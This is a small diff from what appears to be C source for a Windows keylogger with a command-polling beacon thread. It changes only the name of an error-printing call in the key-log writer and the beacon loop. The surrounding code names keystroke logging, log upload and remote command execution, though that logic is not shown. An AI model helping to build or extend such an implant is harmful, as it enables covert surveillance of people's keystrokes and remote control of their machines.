@@ -130,7 +130,7 @@ DWORD WINAPI writeLogThread(LPVOID lpParam) {
         for (int i = 1; i < 3 && ret == R_POST; i++) {
             ret = writeKeyLog(ctx->client, ctx->kLogger);
         }
-        if (ret != R_SUCCESS) { printErr(ret); }
+        if (ret != R_SUCCESS) { printRetCode(ret); }
 
         resetKLBufferAndKey(ctx->kLogger, ctx->__KEY__);
 
@@ -154,7 +154,7 @@ DWORD WINAPI pollCmdsAndBeaconThread(LPVOID lpParam) {
 
         // only execute the commands if there is something to exec. or an err was not found
         if (ret != R_SUCCESS) {
-            printErr(ret);
+            printRetCode(ret);
             goto skipCmds;
         }
         
